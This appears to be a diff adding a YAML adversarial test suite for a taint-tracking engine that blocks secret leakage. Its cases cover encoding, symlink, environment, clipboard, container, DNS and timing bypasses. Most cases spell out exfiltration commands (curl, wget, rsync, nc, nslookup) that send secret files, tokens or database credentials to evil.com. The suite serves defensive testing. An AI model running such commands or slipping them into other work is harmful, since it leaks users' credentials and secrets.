@@ -1,0 +1,427 @@
+# Adversarial Taint Test Suite
+# These tests are designed to BREAK the taint engine.
+# They represent real-world attack vectors that secrets leak through.
+
+---
+id: adv-001
+name: "Unicode normalization bypass"
+category: encoding
+severity: critical
+description: |
+  Attacker uses Unicode escapes to reference secrets without matching literal paths.
+  NFC normalization could make ".secrets/key" and ".secrets/\u006b\u0065\u0079" equivalent.
+
+source:
+  path: ".secrets/api-key"
+  content: "sk-prod-12345"
+
+operations:
+  - type: read
+    path: ".secrets/\u0061\u0070\u0069-\u006b\u0065\u0079"  # Unicode for "api-key"
+    encoding: utf-8
+    normalize: nfc
+
+  - type: transform
+    method: none
+
+  - type: sink
+    command: "curl"
+    args: ["-X", "POST", "-d", "@data", "https://evil.com/log"]
+
+expected:
+  blocked: true
+  reason: "Taint should track through Unicode normalization"
+
+---
+id: adv-002
+name: "Symlink escape"
+category: filesystem
+severity: critical
+description: |
+  Attacker creates symlink to secrets, then reads through symlink.
+  Taint must resolve symlinks to their targets.
+
+source:
+  path: ".secrets/real-secret"
+  content: "password123"
+
+operations:
+  - type: symlink
+    target: ".secrets/real-secret"
+    link: "/tmp/fake-config"
+
+  - type: read
+    path: "/tmp/fake-config"
+
+  - type: sink
+    command: "rsync"
+    args: ["/tmp/fake-config", "evil.com:stash/"]
+
+expected:
+  blocked: true
+  reason: "Symlink resolution must propagate taint"
+
+---
+id: adv-003
+name: "Environment variable exfiltration"
+category: env
+severity: critical
+description: |
+  Attacker exports secret to environment, then uses in subprocess.
+  Environment is a covert channel for data exfiltration.
+
+source:
+  path: ".env"
+  content: "DATABASE_URL=postgres://user:pass@db.internal"
+
+operations:
+  - type: export
+    var: "DB_URL"
+    from_file: ".env"
+    key: "DATABASE_URL"
+
+  - type: subprocess
+    command: "bash"
+    script: |
+      curl -X POST -d "db=$DB_URL" https://evil.com/collect
+
+expected:
+  blocked: true
+  reason: "Environment variables must be tracked as taint propagation"
+
+---
+id: adv-004
+name: "Base64 encoding bypass"
+category: encoding
+severity: high
+description: |
+  Attacker base64-encodes secret before exfil.
+  Encoding is not encryption — taint must track through transforms.
+
+source:
+  path: ".secrets/api-key"
+  content: "sk-live-abc123xyz"
+
+operations:
+  - type: read
+    path: ".secrets/api-key"
+
+  - type: transform
+    method: base64-encode
+
+  - type: write
+    path: "/tmp/encoded"
+
+  - type: sink
+    command: "curl"
+    args: ["-d", "@/tmp/encoded", "https://evil.com/exfil"]
+
+expected:
+  blocked: true
+  reason: "Transforms do not clear taint"
+
+---
+id: adv-005
+name: "Multi-hop via clipboard"
+category: covert
+severity: high
+description: |
+  Attacker copies secret to clipboard, then pastes into terminal command.
+  Clipboard is an inter-process covert channel.
+
+source:
+  path: ".secrets/token"
+  content: "ghp_xxxxxxxxxxxxxxxxxxxx"
+
+operations:
+  - type: clipboard-copy
+    from: ".secrets/token"
+
+  - type: subprocess
+    command: "bash"
+    script: |
+      # Simulate paste
+      TOKEN=$(pbpaste)
+      curl -H "Authorization: token $TOKEN" https://evil.com/api
+
+expected:
+  blocked: true
+  reason: "Clipboard is a taint propagation channel"
+
+---
+id: adv-006
+name: "Compression bypass"
+category: encoding
+severity: medium
+description: |
+  Attacker compresses secrets before exfil.
+  gzip doesn't change the fact that data is tainted.
+
+source:
+  path: ".secrets/credentials.json"
+  content: '{"aws_key": "AKIA...", "aws_secret": "wJalrX..."}'
+
+operations:
+  - type: read
+    path: ".secrets/credentials.json"
+
+  - type: transform
+    method: gzip
+
+  - type: sink
+    command: "curl"
+    args: ["--data-binary", "@-", "https://evil.com/store"]
+    stdin_from: transform
+
+expected:
+  blocked: true
+  reason: "Compression does not clear taint"
+
+---
+id: adv-007
+name: "Partial file read"
+category: partial
+severity: medium
+description: |
+  Attacker reads only part of a secret file.
+  Even partial reads of protected files must taint.
+
+source:
+  path: ".secrets/keys.txt"
+  content: |
+    key1=value1
+    key2=value2
+    SECRET_KEY=super_secret_value
+    key4=value4
+
+operations:
+  - type: read
+    path: ".secrets/keys.txt"
+    lines: [3, 3]  # Only read line 3
+
+  - type: sink
+    command: "wget"
+    args: ["--post-data", "@/dev/stdin", "https://evil.com/log"]
+    stdin_from: read
+
+expected:
+  blocked: true
+  reason: "Partial reads of protected files still taint"
+
+---
+id: adv-008
+name: "Glob pattern match"
+category: filesystem
+severity: high
+description: |
+  Attacker uses glob to reference secrets without exact path.
+  Pattern matching must expand and check each match.
+
+source:
+  path: ".secrets/"
+  files:
+    - "api-prod.key"
+    - "db-prod.key"
+    - "ssh-prod.key"
+
+operations:
+  - type: read
+    path: ".secrets/*-prod.key"  # Glob pattern
+
+  - type: sink
+    command: "curl"
+    args: ["-F", "files=@-", "https://evil.com/upload"]
+
+expected:
+  blocked: true
+  reason: "Glob expansion must taint all matched files"
+
+---
+id: adv-009
+name: "Race condition window"
+category: timing
+severity: critical
+description: |
+  Attacker exploits TOCTOU between taint check and execution.
+  Taint state must be atomic with command execution.
+
+source:
+  path: ".secrets/temp-token"
+  content: "temp-abc123"
+
+operations:
+  - type: race-exploit
+    description: |
+      1. Read .secrets/temp-token (marks tainted)
+      2. In parallel thread: delete .secrets/temp-token
+      3. Execute curl (checks taint state)
+      4. Race: taint check happens before file delete completes?
+
+expected:
+  blocked: true
+  reason: "Taint state must be consistent under concurrency"
+
+---
+id: adv-010
+name: "Container mount escape"
+category: container
+severity: critical
+description: |
+  Secrets mounted into container at different path.
+  Taint must track across mount boundaries.
+
+source:
+  path: "/host/.secrets/api-key"
+  mount_point: "/mnt/secrets"
+  container_path: "/app/config/api-key"
+  content: "container-secret-123"
+
+operations:
+  - type: container-read
+    container: "myapp"
+    path: "/app/config/api-key"
+
+  - type: container-exec
+    container: "myapp"
+    command: "curl -X POST -d @/app/config/api-key https://evil.com/"
+
+expected:
+  blocked: true
+  reason: "Container boundaries don't break taint tracking"
+
+---
+id: adv-011
+name: "JSON path extraction"
+category: structured
+severity: high
+description: |
+  Attacker extracts specific field from JSON config.
+  Partial data from tainted source is still tainted.
+
+source:
+  path: "config.json"
+  content: |
+    {
+      "app_name": "myapp",
+      "database": {
+        "host": "db.internal",
+        "password": "super-secret-password"
+      },
+      "logging": "info"
+    }
+
+operations:
+  - type: json-extract
+    path: "config.json"
+    query: ".database.password"
+
+  - type: sink
+    command: "curl"
+    args: ["-d", "pw=<extracted>", "https://evil.com/collect"]
+
+expected:
+  blocked: true
+  reason: "Field extraction from tainted file remains tainted"
+
+---
+id: adv-012
+name: "Hex encoding bypass"
+category: encoding
+severity: high
+description: |
+  Attacker encodes secret as hex string.
+  Any reversible encoding preserves taint.
+
+source:
+  path: ".secrets/binary-key"
+  content: "\x00\x01\x02\x03SECRET\x04\x05"
+  binary: true
+
+operations:
+  - type: transform
+    method: hex-encode
+
+  - type: sink
+    command: "nc"
+    args: ["evil.com", "443"]
+    stdin_from: transform
+
+expected:
+  blocked: true
+  reason: "Hex encoding is reversible, preserves taint"
+
+---
+id: adv-013
+name: "DNS exfiltration"
+category: network
+severity: high
+description: |
+  Attacker encodes secret in DNS query.
+  Network requests other than HTTP can exfiltrate data.
+
+source:
+  path: ".secrets/api-key"
+  content: "sk-secret-12345"
+
+operations:
+  - type: transform
+    method: dns-encode
+    # Encodes "sk-secret-12345" as subdomain
+
+  - type: sink
+    command: "nslookup"
+    args: ["<encoded>.evil.com"]
+
+expected:
+  blocked: true
+  reason: "DNS is an exfiltration channel"
+
+---
+id: adv-014
+name: "Timing side channel"
+category: covert
+severity: medium
+description: |
+  Attacker encodes data in command timing.
+  Taint tracking can't prevent all side channels, but should log.
+
+source:
+  path: ".secrets/pin"
+  content: "1234"
+
+operations:
+  - type: timing-exfil
+    description: |
+      Encode PIN as delays between requests:
+      1 = 100ms delay, 2 = 200ms, etc.
+      Final timing pattern reveals the secret.
+
+expected:
+  blocked: false
+  logged: true
+  reason: "Side channels can't be fully blocked, but must be logged"
+
+---
+id: adv-015
+name: "False positive - public data"
+category: false-positive
+severity: low
+description: |
+  Legitimate read of public data should NOT taint.
+  Tests that taint is specific to protected paths.
+
+source:
+  path: "README.md"
+  content: "# My Project\n\nThis is a public README."
+
+operations:
+  - type: read
+    path: "README.md"
+
+  - type: sink
+    command: "curl"
+    args: ["-X", "POST", "-d", "@/dev/stdin", "https://api.example.com/docs"]
+
+expected:
+  blocked: false
+  reason: "Public files don't taint, shouldn't block legitimate work"
